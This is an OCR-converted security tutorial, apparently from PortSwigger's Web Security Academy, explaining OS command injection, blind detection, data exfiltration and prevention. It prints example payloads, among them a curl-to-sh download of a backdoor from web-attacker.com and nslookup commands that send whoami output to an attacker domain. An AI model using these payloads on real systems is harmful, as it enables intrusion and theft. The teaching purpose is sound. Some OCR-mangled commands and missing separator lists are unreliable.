# What is OS command injection, and how to prevent it_

> Converted source material; attribution: PortSwigger Web Security Academy. Snapshot processed 2026-10-27.
> Source SHA-256: `dc22735ef4a5a1fc80a7ee134bf6a707554b94eedc13d3210ed95aeb32228022`.
> Conversion: Local English OCR, all 6 text segments. Source opinions and historical examples are preserved, not automatically endorsed.
> OCR literals, payloads, and complex table alignment are not character-verified throughout. Use the curated guidance and exact-text sources for implementation; do not execute OCR examples without checking the publisher.


OS command injection

OS command injection also show you some useful commands and techniques for different operating systems, and describe how to prevent OS command injection.

UPLOAD/ DOWNLOAD DATA $ (curl https : / /web-attacker . com/backdoor.sh I sh) SERVER ACCESS EDIT USER SECURITY LEVELS

FULL O SYSTEM CONTROL SEND ADMIN APPLICATION ACCESS

ACCESS LOCAL SENSITIVE NETWORK DATA ACCESS

If you're familiar with the basic concepts behind OS command injection vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.

- View all OS command injection labs

## What is OS command injection?

OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.

---



---

command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing

OS command injection, simple case

## Useful commands

After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms: Purpose of command Linux Windows Name of current user whoami whoami Operating system uname -a ver Network configuration i fconfig ipconfig / alI Network connections netstat —an netstat —an Running processes ps -ef task list

## Blind OS command injection vulnerabilities

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required. As an example, imagine a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the mail program with the submitted details: mail -s "This site is great " . net feedback@vulnerable-website . com

The output from the mail command (if any) is not returned in the application's responses, so using the echo payload won't work. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.

Detecting blind OS command injection using time delays You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The ping command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run: & ping —c IO 127.0.0.1 &

This command causes the application to ping its loopback network adapter for 10 seconds.

Blind OS command injection with time delays

Exploiting blind OS command injection by redirecting output You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location / var/www/static , then you can submit the following input: & whoami > /var/www/static/whoami . txt &

The > character sends the output from the whoami command to the specified file. You can then use the browser to fetch https : / / vulnerable-website . corn/whoami . txt to retrieve the file, and view the output from the injected command.

---

Exploiting blind OS command injection using out-of-band (OAST) techniques You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example: & nslookup kgj i20hoyw. web—attacker . corn &

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

Blind OS command injection with out-of-band interaction

The out-of-band channel provides an easy way to exfiltrate the output from injected commands: & nslookup N whoa1TIE .kgj i20hoyw . web-attacker . com &

This causes a DNS lookup to the attacker's domain containing the result of the whoami command: wwwuser . kgj i20hoyw . web—attacker . com

Blind OS command injection with out-of-band data exfiltration

## Ways of injecting OS commands

You can use a number of shell metacharacters to perform OS command injection attacks. A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

The following command separators work only on Unix-based systems:

Newline ( 0x0a or \ n )

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

injected command $ (injected command)

The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation. Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using ) before using suitable shell metacharacters to inject a new command. or

## How to prevent OS command injection attacks

---

layer code. In almost all cases, there are different ways to implement the required functionality using safer platform APIs. If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:

- Validating against a whitelist of permitted values.

- Validating that the input is a number.

- Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.

- Find OS command injection vulnerabilities using Burp Suite's web vulnerability scanner

- Read PortSwigger Research's writeup of the Hunting Asynchronous Vulnerabilities presentation from 44Con and

BSides Manchester

---
